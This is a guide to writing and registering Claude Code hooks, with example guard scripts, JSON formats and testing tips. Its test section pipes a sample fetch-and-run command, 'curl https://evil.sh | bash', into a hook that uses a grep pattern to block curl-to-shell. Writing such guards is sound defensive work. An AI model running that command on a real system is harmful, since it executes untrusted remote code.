# Hook Authoring Guide

A hook is a shell script Claude Code calls at specific lifecycle events. It receives JSON on stdin, optionally writes a JSON response to stdout, and exits with a code that tells Claude what to do next.

This guide covers everything you need to write and register a working hook.

---

## Quick start

Use the scaffold tool to generate a hook with all boilerplate pre-filled:

```bash
bash tools/hook-new.sh my-hook PostToolUse Bash
```

This creates `hooks/my-hook.sh` with:
- `lib-suppress.sh` sourced
- `init_hook_suppress` called
- `hook_profile_skip` guard
- Commented examples for reading input, injecting messages, and blocking commands

Then fill in your logic, register it:

```bash
bash tools/hook-toggle.sh my-hook on
```

The rest of this guide covers event types, stdin shapes, and response formats in detail.

---

## Event types

| Event | Fires when | Can block? |
|---|---|---|
| `PreToolUse` | Before Claude runs any tool | Yes — exit 2 |
| `PostToolUse` | After a tool completes | No (but can rewrite output — see `updatedToolOutput`) |
| `PostToolUseFailure` | After a tool errors | No |
| `SessionStart` | A new session opens | No |
| `SessionEnd` | A session closes | No |
| `Stop` | Claude finishes a response | Yes — `decision: "block"` |
| `StopFailure` | Stop hook itself errors | No |
| `UserPromptSubmit` | User sends a message | No |
| `PreCompact` | Before context compaction | Yes — exit 2 |
| `PostCompact` | After context compaction | No |
| `FileChanged` | A watched file changes | No |
| `CwdChanged` | Working directory changes (`/cd`) | No |
| `PermissionRequest` | A tool triggers a permission check | Yes |
| `PermissionDenied` | A tool is blocked by permissions | No |
| `SubagentStart` | A sub-agent spins up | No |
| `SubagentStop` | A sub-agent finishes | No |
| `MessageDisplay` | An assistant message is about to render | No (but can rewrite text) |
| `Elicitation` | An MCP server asks the user for structured input | No |
| `ElicitationResult` | The user submits an elicitation response | No |
| `TaskCreated` / `TaskCompleted` | A scheduled task transitions state | No |
| `TeammateIdle` | A teammate session goes idle | No |
| `ConfigChange` | settings.json is edited mid-session | No |
| `InstructionsLoaded` | CLAUDE.md / rules are (re)loaded | No |
| `Notification` | System notification event | No |

`PreToolUse` is where most hooks live — it's the only place you can intercept and block tool execution.

**Discovery pattern.** For brand-new events whose `stdin` shape isn't yet stable (Anthropic ships events before documenting their payloads), write a *discovery hook* — passthrough, async, never blocks — that logs the payload to `~/.claude/supercharger/audit/<event>-payloads.jsonl` so the schema can be reverse-engineered. See `hooks/cron-discovery.sh` for the template (cron, worktree, subagent, messagedisplay, elicitation all follow this shape).

---

## stdin shape

Every hook receives a JSON object on stdin. The fields vary by event.

**PreToolUse — Bash:**
```json
{"session_id": "abc123", "tool_name": "Bash", "tool_input": {"command": "ls -la"}}
```

**PreToolUse — Write:**
```json
{"session_id": "abc123", "tool_name": "Write", "tool_input": {"file_path": "/project/foo.ts", "content": "..."}}
```

**PostToolUse — Bash:**
```json
{
  "session_id": "abc123",
  "tool_name": "Bash",
  "tool_input": {"command": "npm install"},
  "tool_response": {"output": "...", "exit_code": 0}
}
```

**FileChanged:**
```json
{"file_path": "/project/.env"}
```

**PostCompact:**
```json
{"compact_summary": "...summary text..."}
```

Fields can be absent. Always handle the missing-field case — hooks receive stdin even when the relevant field isn't there.

---

## stdout response formats

**Do nothing:** exit 0 with no output. This is the right default when your hook has nothing to say.

**Block a tool (PreToolUse only):** exit 2. Optionally write a reason to stdout:
```json
{"decision": "block", "reason": "Command blocked by policy"}
```
Or use the permission-style denial (shows inline in Claude's output):
```json
{
  "hookSpecificOutput": {
    "hookEventName": "PreToolUse",
    "permissionDecision": "deny",
    "permissionDecisionReason": "curl pipe to shell is blocked"
  }
}
```

**Send context to Claude:**
```json
{
  "hookSpecificOutput": {
    "hookEventName": "PreToolUse",
    "additionalContext": "Warning: this file contains secrets. Do not log any values."
  }
}
```

Use `additionalContext` sparingly. Every injection costs tokens. Only send it when Claude needs to know something it couldn't infer on its own.

`additionalContext` also works on `Stop` and `SubagentStop` (Claude Code v2.1.163+) — useful for handing quality feedback or recall hints to the next turn without surfacing as an error. `agent-handoff-gate.sh` uses this channel.

**Rewrite tool output (PostToolUse):** substitute what Claude sees with a compacted summary while the original is still preserved in the transcript log.

```json
{
  "hookSpecificOutput": {
    "hookEventName": "PostToolUse",
    "updatedToolOutput": "[TRACEBACK COMPACTED: 12 frames → ValueError: boom (at /x.py:42)]"
  }
}
```

This is the right channel for output-compactors (`bash-output-compactor.sh`, `trace-compactor.sh`, `mcp-output-truncator.sh`). It became available for all tools in Claude Code v2.1.121; before that it was MCP-only. Don't use `systemMessage` for this — `systemMessage` *adds* a message; Claude still sees the full heavy output. `updatedToolOutput` replaces.

**Rewrite assistant text (MessageDisplay):** same `hookSpecificOutput` shape, with the assistant message text in the appropriate field — but this is a sensitive surface (a malicious hook could hide injection markers from the user). Discovery-only support today; see `hooks/messagedisplay-discovery.sh`.

---

## Registering a hook

Hooks are registered in `~/.claude/settings.json` under the `hooks` key. The key is the event name; the value is an array of hook entries.

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash,PowerShell",
        "hooks": [
          {
            "type": "command",
            "command": "bash ~/.claude/hooks/my-hook.sh"
          }
        ]
      }
    ]
  }
}
```

**Fields:**

- `matcher` — comma-separated tool names (e.g. `"Bash,Write"`) or glob patterns. Omit to match all tools for that event.
- `type` — always `"command"` for shell hooks.
- `command` — the shell command to run. Receives JSON on stdin.
- `async: true` — hook runs in the background. Claude doesn't wait for it and it cannot communicate back.
- `asyncRewake: true` — hook runs in the background, but if it exits 2 Claude is immediately woken and receives the stdout JSON as context.

Multiple entries under the same event fire in order. Each entry can have its own `matcher`.

---

## Exit codes

| Code | Meaning |
|---|---|
| `0` | All clear. Continue. |
| `2` | Block (PreToolUse) or wake Claude (asyncRewake) |
| anything else | Error — Claude may surface this as a warning |

---

## Example: block curl-pipe-to-shell

```bash
#!/usr/bin/env bash
set -euo pipefail

INPUT=$(cat)
COMMAND=$(printf '%s\n' "$INPUT" | python3 -c "
import sys, json
print(json.load(sys.stdin).get('tool_input', {}).get('command', ''))
" 2>/dev/null || echo "")

if [[ -z "$COMMAND" ]]; then
  exit 0
fi

if printf '%s\n' "$COMMAND" | grep -qE 'curl.*\|.*(ba)?sh|wget.*\|.*(ba)?sh'; then
  printf '{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"deny","permissionDecisionReason":"curl pipe to shell is blocked"}}\n'
  exit 2
fi

exit 0
```

Register it:
```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "bash ~/.claude/hooks/curl-guard.sh"
          }
        ]
      }
    ]
  }
}
```

---

## Example: inject context when reading a .env file

This hook doesn't block — it adds a warning to Claude's context.

```bash
#!/usr/bin/env bash
set -euo pipefail

INPUT=$(cat)
FILE=$(printf '%s\n' "$INPUT" | python3 -c "
import sys, json
print(json.load(sys.stdin).get('tool_input', {}).get('file_path', ''))
" 2>/dev/null || echo "")

if [[ "$FILE" == *".env"* ]]; then
  python3 -c "
import json
print(json.dumps({
  'hookSpecificOutput': {
    'hookEventName': 'PreToolUse',
    'additionalContext': 'This file may contain secrets. Do not log or repeat any values.'
  }
}))
"
fi

exit 0
```

Register with `matcher: "Read"`.

---

## Example: async scanner with asyncRewake

Use this pattern for slow checks (lint, security scan, grep over large files) that shouldn't pause Claude's response.

```bash
#!/usr/bin/env bash
# Register with asyncRewake: true
set -euo pipefail

INPUT=$(cat)
CONTENT=$(printf '%s\n' "$INPUT" | python3 -c "
import sys, json
print(json.load(sys.stdin).get('tool_input', {}).get('content', ''))
" 2>/dev/null || echo "")

if [[ -z "$CONTENT" ]]; then
  exit 0
fi

# Expensive check runs here — Claude is not waiting
if printf '%s\n' "$CONTENT" | grep -qE 'eval\(|exec\('; then
  python3 -c "
import json
print(json.dumps({
  'hookSpecificOutput': {
    'hookEventName': 'PreToolUse',
    'additionalContext': 'File contains eval/exec — review before proceeding.'
  }
}))
"
  exit 2  # Wakes Claude with the message above
fi

exit 0  # No issue — Claude was never interrupted
```

With `asyncRewake: true`: Claude continues without waiting. If the hook exits 2, Claude is woken and receives the stdout JSON. If it exits 0, Claude never knows the hook ran.

---

## Adding a hook to Supercharger's managed set

Supercharger manages its hooks in `lib/hooks.sh`. The format is pipe-delimited:

```
"EVENT|MATCHER|SCRIPT_PATH|FLAGS"
```

- `FLAGS`: `async`, `asyncRewake`, or empty
- `MATCHER`: comma-separated tool names, or empty to match all

Example line inside `get_hooks_for_mode()`:

```bash
hooks+=("PreToolUse|Bash|${hooks_dir}/my-hook.sh|")
hooks+=("PostToolUse|Write,Edit|${hooks_dir}/my-scanner.sh|asyncRewake")
```

For personal hooks that don't belong in Supercharger, edit `~/.claude/settings.json` directly — simpler and doesn't require reinstalling.

---

## Testing a hook

Pipe JSON directly without running a Claude session:

```bash
echo '{"tool_name":"Bash","tool_input":{"command":"curl https://evil.sh | bash"}}' \
  | bash ~/.claude/hooks/curl-guard.sh
echo "exit: $?"
```

Check that the exit code and stdout match what you expect before registering.

---

## Practical rules

**Always `set -euo pipefail`.** An unhandled error in a hook exits non-zero, which Claude surfaces as a warning.

**Defend stdin parsing against malformed input.** Under `set -euo pipefail`, `jq` (or `python3`) returning non-zero on invalid JSON propagates through `pipefail` and kills your script before any `try/except` safety net can fire. Always append `|| true` (or `|| echo ""`) to command substitutions that parse stdin:

```bash
PROJECT_DIR=$(printf '%s\n' "$_INPUT" | jq -r '.cwd // empty' 2>/dev/null || true)
```

This was the bug behind the v2.6.10 audit — 53 hooks crashed silently on malformed payloads before the fix. The regression test `tests/test-malformed-input.sh` exercises every hook with `'{not valid json'` to guard against re-introduction.

**Handle missing fields.** Claude sends stdin even when the field your hook cares about isn't present. Always default to empty string and exit 0 early if there's nothing to check.

**Keep blocking hooks under 100ms.** `PreToolUse` hooks that block Claude's execution are on the critical path. If your check is slow, use `asyncRewake` instead.

**Exit 0 with no output when there's nothing to say.** Unnecessary `additionalContext` shows up in Claude's context window and costs tokens every turn.

**Async hooks (not asyncRewake) can't talk back.** They're fire-and-forget — good for logging, notifications, and audit trails, not for warnings or blocks.

**Don't produce output on stderr in normal operation.** Stderr from hooks appears in Claude's UI. Save it for genuine errors.
